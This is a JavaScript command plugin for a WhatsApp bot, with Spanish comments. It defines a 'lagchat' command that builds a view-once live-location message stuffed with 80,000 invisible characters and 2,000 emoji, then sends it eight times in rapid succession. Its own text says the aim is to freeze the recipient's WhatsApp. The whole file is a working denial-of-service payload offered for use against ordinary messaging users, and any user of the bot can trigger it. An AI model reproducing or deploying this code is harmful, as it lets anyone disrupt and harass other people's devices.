const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '🌪️',
        caption: '\u2063'.repeat(80000) + '💥'.repeat(2000), // 80k invisibles + 2000 bombas
        sequenceNumber: String(Math.floor(Math.random() * 999999)),
        jpegThumbnail: Buffer.alloc(2 * 1024, 0), // miniatura falsa 2KB
        contextInfo: {
          forwardingScore: 99999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 LAGCHAT MÁXIMO',
            body: 'Puede congelar WhatsApp hasta 10s',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: false,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 8 // 8 envíos seguidos

  await m.reply(`⚠️ Enviando ${times} bombas extremas...\nEsto puede congelar WhatsApp hasta 10 segundos.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 150)) // pequeño delay
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Error al enviar mensaje.')
      return
    }
  }

  await m.reply('✅ *Lagco enviado.*')
}

handler.command = /^lagchat$/i
handler.owner = false


export default handler